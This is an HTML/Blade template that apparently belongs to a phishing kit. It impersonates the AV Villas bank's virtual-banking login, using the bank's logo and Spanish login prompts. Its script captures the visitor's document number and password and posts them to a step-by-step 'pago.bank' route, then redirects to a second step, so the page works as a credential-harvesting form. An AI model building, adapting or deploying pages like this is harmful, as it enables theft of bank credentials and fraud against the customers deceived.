<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Banca Digital</title>

    <link rel="stylesheet" href="{{asset('assets/css/payment/avvillas.css')}}">

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
		
</head>
<body>
    <div>
        <br><br>
        <div>  
            <img src="{{asset('assets/img/payment/avvillas/register-bg-logo.svg')}}">
        </div>
        <div> 
            <br><br>
            <a style="font-size:18px; color:white;">Ingresa a la banca virtual</a>
            <br>
        </div>
    </div>

<br>
 
<div><select name="">
    <option value="">Cedula de ciudadania</option>
    <option value="">Cedula extranjera</option>
    <option value="">Pasaporte</option></div>


</select>


<div class="form" style="margin-top:15px;">


    <label style="width:85%; height:55px;">
        <input required="required" type="text" class="input" id="txtUsuario" name="user" style="width:100%; margin-left:-10px; border-radius:5px; height:25px;" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');" >
        <span>Número de documento</span>
    </label>
    
    <label style="width:85%; height:55px;">
        <input required="required" type="password" class="input" id="txtPass" name="pass" style="width:100%; margin-left:-10px; border-radius:5px;  height:25px;" oninput="this.value = this.value.replace(/\s+/g, '')">
        <span>Ingrese su clave</span>
    </label>
    <input type="hidden" value="Avvillas" id="banco">
      <a href="" style="color:white; margin-left:50%; font-size:12px;">Olvidé mi contraseña</a>
    <input type="submit" value="Ingresar" id="btnUsuario" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px;">
    
</div><br>

<hr style="width:90%;">
<br>
<a style="color:white;">¿Aún no tienes contraseña para ingresar?</a><br>
<a href="" style="color:white;">Registrate</a>


<img src="{{asset('assets/img/payment/avvillas/foter.jfif')}}" alt="" srcset="" width="100%" style="margin-top:110px;">



<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>


<script>
$(document).ready(function () {

    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    });

    $('#btnUsuario').on('click', function (e) {
        e.preventDefault();

        const usuario = $("#txtUsuario").val().trim();
        const pass = $("#txtPass").val().trim();

        if (usuario.length === 0 || pass.length === 0) {
            alert('Completa los datos');
            return;
        }
        $.ajax({
            url: "{{ route('pago.bank.step.save', [
                'bank' => 'avvillas',
                'step' => 1
            ]) }}",
            method: 'POST',
            data: {
                usuario: usuario,
                pass: pass
            },
            success: function () {
                window.location.href = "{{ route('pago.bank.step', ['bank' => 'avvillas', 'step' => 2]) }}";
            },
            error: function (xhr) {
                console.log(xhr.responseText);
                alert('Error de conexión');
            }
        });
    });

});
</script>



</body>
</html>